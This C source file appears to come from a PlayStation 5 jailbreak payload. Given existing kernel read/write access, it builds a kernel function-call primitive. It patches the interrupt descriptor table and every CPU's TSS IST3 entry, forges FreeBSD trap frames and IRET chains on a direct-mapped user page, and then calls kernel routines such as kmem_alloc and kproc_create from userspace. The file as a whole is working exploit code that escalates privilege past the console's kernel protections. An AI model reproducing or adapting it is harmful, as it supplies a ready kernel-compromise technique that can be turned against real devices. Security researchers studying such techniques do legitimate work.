#include "../include/kprim.h"
#include "../include/page.h"
#include "../include/idt.h"

#include <ps5/kernel.h>
#include <ps5/payload.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "../include/notify.h"

//
// Exec Flow:
//   1. Userspace: writes fake trap frame + return chain to user page
//   2. INT N from inline stub
//   3. CPU loads RSP from TSS.IST3 (our gadget stack on DMAP)
//   4. CPU pushes SS/RSP/RFLAGS/CS/RIP, jumps to IDT handler
//   5. Handler = swapgs; add rsp, 0xe8; iret (kernel TEXT)
//   6. IRET loads RIP=pop_all_iret, RSP=fake trap frame
//   7. pop_all_iret pops all regs (rdi..r15), IRETs to target function
//   8. Target returns -> swapgs; add rsp, 0xe8; iret -> userspace
//   9. RAX = kernel function return value (preserved through IRET)
//


static const kprim_fw_entry* kprim_find_fw(uint32_t fw_ver)
{
    for (int i = 0; fw_table[i].fw != 0; i++)
    {
        if (fw_table[i].fw == fw_ver)
            return &fw_table[i];
    }

    return NULL;
}


static void kprim_build_idt_gate(idt_64* gate, uint64_t handler, uint16_t selector, uint8_t ist, uint8_t dpl)
{
    memset(gate, 0, sizeof(idt_64));
    gate->offset_low    = (uint16_t)(handler & 0xFFFF);
    gate->offset_middle = (uint16_t)((handler >> 16) & 0xFFFF);
    gate->offset_high   = (uint32_t)((handler >> 32) & 0xFFFFFFFF);
    gate->selector      = selector;
    gate->ist_index     = ist;
    gate->type          = 0x0E;  // 64-bit interrupt gate
    gate->dpl           = dpl;
    gate->present       = 1;
}


int kprim_init(kprim_ctx* ctx, uint32_t fw_version)
{
    memset(ctx, 0, sizeof(kprim_ctx));

    ctx->fw = kprim_find_fw(fw_version);
    if (!ctx->fw)
    {
        notify_send("Failed to get fw_version\n");
        return -1;
    }
        
    ctx->kdata_base = KERNEL_ADDRESS_DATA_BASE;
    ctx->gadget_swapgs_add_rsp_iret = ctx->kdata_base + (ctx->fw->doreti_iret - 10);
    // PS5 trapframe: 0x70 bytes between last register and IRET frame
    // (trapno/fs/gs/addr/flags/es/ds + 8 MSR save slots at 0xa0-0xd8)
    // TF_RIP = 0xe8, confirmed from kernel disasm: "add rsp, 0xe8; iretq"
    ctx->tf_skip = 0x70;

    // pop_all_iret = POP_FRAME start (15 movq register loads + addq $0xe8,%rsp + iretq)
    ctx->gadget_pop_all_iret = ctx->kdata_base + ctx->fw->pop_all_iret;

    // read kernel pmap directly from known offset
    flat_pmap kernel_pmap;
    kernel_copyout(ctx->kdata_base + ctx->fw->kernel_pmap_store, &kernel_pmap, sizeof(kernel_pmap));
    if (kernel_pmap.pm_pml4 == 0 || kernel_pmap.pm_cr3 == 0)
        return -1;

    ctx->kernel_pml4 = kernel_pmap.pm_pml4;
    ctx->kernel_cr3 = kernel_pmap.pm_cr3;
    ctx->dmap_base = kernel_pmap.pm_pml4 - kernel_pmap.pm_cr3;

    void* page = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANON, -1, 0);
    if (page == MAP_FAILED)
        return -1;

    memset(page, 0, 0x4000);
    ctx->user_page = page;

    //
    // get proc pmap
    // 
    flat_pmap user_pmap;
    intptr_t proc_addr = kernel_get_proc(getpid());
    if (!proc_addr)
        return -1;

    uint64_t vmspace_ptr;
    kernel_copyout(proc_addr + 0x200, &vmspace_ptr, sizeof(vmspace_ptr));
    kernel_copyout(vmspace_ptr + VMSPACE_PMAP_OFFSET, &user_pmap, sizeof(user_pmap));

    uint64_t phys = page_vtophys(ctx->dmap_base, user_pmap.pm_cr3, (uint64_t)page);
    if (!phys)
        return -1;

    ctx->page_phys = phys;
    ctx->page_dmap = ctx->dmap_base + phys;

    // IDT setup
    ctx->idt_base = ctx->kdata_base + ctx->fw->idt;

    int vector = KPRIM_IDT_VECTOR;

    ctx->vector = vector;
    ctx->idt_entry_addr = ctx->idt_base + vector * sizeof(idt_64);

    // save original gate
    kernel_copyout(ctx->idt_entry_addr, &ctx->orig_gate, sizeof(idt_64));

    // read kernel CS from IDT[0]
    idt_64 ref_gate;
    kernel_copyout(ctx->idt_base, &ref_gate, sizeof(idt_64));
    ctx->kernel_cs = ref_gate.selector;

    // TSS base (patching deferred to kprim_arm)
    ctx->tss_base = ctx->kdata_base + ctx->fw->tss_array;

    // Save original IST3 values for all CPUs
    for (int cpu = 0; cpu < TSS_NUM_CPUS; cpu++)
    {
        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST_OFFSET;
        kernel_copyout(tss_ist3_addr, &ctx->orig_ist[cpu], sizeof(uint64_t));
    }

    // Build new IDT gate (stored locally, written in kprim_arm)
    kprim_build_idt_gate(&ctx->new_gate, ctx->gadget_swapgs_add_rsp_iret,
        ctx->kernel_cs, 2, 3);

    // Entry IRET frame: lands at pop_all_iret with RSP=fake trap frame
    volatile uint64_t* entry_frame = (volatile uint64_t*)((uint8_t*)page + PAGE_ENTRY_IRET_OFF);
    entry_frame[0] = ctx->gadget_pop_all_iret;
    entry_frame[1] = ctx->kernel_cs; // make iret just go back to kernel
    entry_frame[2] = 0x202;
    entry_frame[3] = ctx->page_dmap + PAGE_TRAPFRAME_OFF;
    entry_frame[4] = 0x00;

    // Int stub: int N; ret (written once)
    uint8_t* stub = (uint8_t*)page + PAGE_INTSTUB_OFF;
    stub[0] = 0xCD;
    stub[1] = (uint8_t)vector;
    stub[2] = 0xC3;

    ctx->initialized = 1;
    return 0;
}


//
// arm/disarm — patch IDT+TSS before each kcall, restore after to avoid crashes
//
static void kprim_arm(kprim_ctx* ctx)
{
    // Patch TSS IST3 for all CPUs → our DMAP gadget stack
    uint64_t ist3_val = ctx->page_dmap + PAGE_IST_TOP_OFF;
    for (int cpu = 0; cpu < TSS_NUM_CPUS; cpu++)
    {
        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST_OFFSET;
        kernel_copyin(&ist3_val, tss_ist3_addr, sizeof(uint64_t));
    }

    // Patch IDT gate
    kernel_copyin(&ctx->new_gate, ctx->idt_entry_addr, sizeof(idt_64));
}

static void kprim_disarm(kprim_ctx* ctx)
{
    // Restore original IDT gate
    kernel_copyin(&ctx->orig_gate, ctx->idt_entry_addr, sizeof(idt_64));

    // Restore original TSS IST3
    for (int cpu = 0; cpu < TSS_NUM_CPUS; cpu++)
    {
        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST_OFFSET;
        kernel_copyin(&ctx->orig_ist[cpu], tss_ist3_addr, sizeof(uint64_t));
    }
}


//
// Fake trap frame at PAGE_TRAPFRAME_OFF (FreeBSD amd64 trapframe layout):
//
//   +0x00: [0..14] registers (rdi,rsi,rdx,rcx,r8,r9,rax,rbx,rbp,r10-r15)
//   +0x78: [skip]  tf_skip bytes (trapno/err/fs/gs/etc.) — zeroed
//   +0x78+skip:    IRET frame (RIP=target, CS, RFLAGS, RSP=&retchain, SS)
//
//   tf_skip is read from the kernel's POP_FRAME addq instruction.
//   Simple layout: tf_skip=0x10, Extended (FreeBSD 11): tf_skip=0x20
//
// Return chain at PAGE_RETCHAIN_OFF:
//   [0]  swapgs_add_rsp_iret  <- target rets here
//   ... 0xe8 bytes padding ...
//   [30] return IRET frame (user_rip, CS=0x43, RFLAGS, user_rsp, SS=0x3B)
//

uint64_t kprim_kcall(kprim_ctx* ctx, uint64_t target,
    uint64_t a1, uint64_t a2, uint64_t a3,
    uint64_t a4, uint64_t a5, uint64_t a6)
{
    if (!ctx->initialized)
        return (uint64_t)-1;

    uint8_t* page = (uint8_t*)ctx->user_page;

    // Rewrite entry IRET frame to avoid garbage
    volatile uint64_t* entry_frame = (volatile uint64_t*)(page + PAGE_ENTRY_IRET_OFF);
    entry_frame[0] = ctx->gadget_pop_all_iret;
    entry_frame[1] = ctx->kernel_cs;
    entry_frame[2] = 0x202;
    entry_frame[3] = ctx->page_dmap + PAGE_TRAPFRAME_OFF;
    entry_frame[4] = 0x00;

    // Write fake trap frame: 15 registers + tf_skip padding + IRET frame
    uint8_t* tf_base = page + PAGE_TRAPFRAME_OFF;
    volatile uint64_t* tf = (volatile uint64_t*)tf_base;
    tf[0]  = a1;                // rdi
    tf[1]  = a2;                // rsi
    tf[2]  = a3;                // rdx
    tf[3]  = a4;                // rcx
    tf[4]  = a5;                // r8
    tf[5]  = a6;                // r9
    tf[6]  = 0;                 // rax
    tf[7]  = 0;                 // rbx
    tf[8]  = 0;                 // rbp
    tf[9]  = 0;                 // r10
    tf[10] = 0;                 // r11
    tf[11] = 0;                 // r12
    tf[12] = 0;                 // r13
    tf[13] = 0;                 // r14
    tf[14] = 0;                 // r15

    // Zero the skip region (trapno/err/fs/gs/etc.) — size from kernel's addq
    memset(tf_base + 0x78, 0, ctx->tf_skip);

    // Inner IRET frame: placed at offset 0x78 + tf_skip
    volatile uint64_t* iret = (volatile uint64_t*)(tf_base + 0x78 + ctx->tf_skip);
    iret[0] = target;           // RIP
    iret[1] = ctx->kernel_cs;   // CS
    iret[2] = 0x202;            // RFLAGS
    iret[3] = ctx->page_dmap + PAGE_RETCHAIN_OFF;  // RSP
    iret[4] = 0x00;             // SS

    // Write return chain
    volatile uint64_t* ret = (volatile uint64_t*)(page + PAGE_RETCHAIN_OFF);
    ret[0] = ctx->gadget_swapgs_add_rsp_iret;  // target rets here

    // 0xe8 bytes padding (29 qwords)
    for (int j = 1; j <= 29; j++)
        ret[j] = 0;

    // Return IRET frame at ret[30] (= retchain + 8 + 0xe8 = retchain + 0xf0)
    uint64_t stub_addr = (uint64_t)(page + PAGE_INTSTUB_OFF);
    uint64_t user_rip = stub_addr + 2;  // the ret instruction

    ret[30] = user_rip;
    ret[31] = 0x43;
    ret[32] = 0x202;
    ret[33] = 0;        // RSP (patched in asm)
    ret[34] = 0x3B;

    volatile uint64_t* ret_rsp = &ret[33];

    // Patch IDT+TSS, fire, then restore
    kprim_arm(ctx);

    uint64_t result;
    __asm__ volatile(
        "push %%rbp\n\t"
        "push %%rbx\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"
        "lea -8(%%rsp), %%rcx\n\t"
        "mov %%rcx, (%[rsp_slot])\n\t"
        "call *%[stub]\n\t"
        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rbx\n\t"
        "pop %%rbp\n\t"
        : "=a"(result)
        : [stub] "r"(stub_addr), [rsp_slot] "r"(ret_rsp)
        : "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11",
          "memory", "cc"
    );

    kprim_disarm(ctx);
    return result;
}


//
// kfunction calls kmem_alloc and kproc_create
//

uint64_t kprim_kmem_alloc(kprim_ctx* ctx, size_t size)
{
    return kprim_kcall(ctx, ctx->kdata_base + ctx->fw->kmem_alloc, size, 0, 0, 0, 0, 0);
}

int kprim_kproc_create(kprim_ctx* ctx, uint64_t func, uint64_t arg, uint64_t name)
{
    return (int)kprim_kcall(ctx, ctx->kdata_base + ctx->fw->kproc_create, func, arg, 0, 0, 0, name);
}

void kprim_cleanup(kprim_ctx* ctx)
{
    if (!ctx->initialized)
        return;

    if (ctx->user_page)
    {
        munmap(ctx->user_page, 0x4000);
        ctx->user_page = NULL;
    }

    ctx->initialized = 0;
}
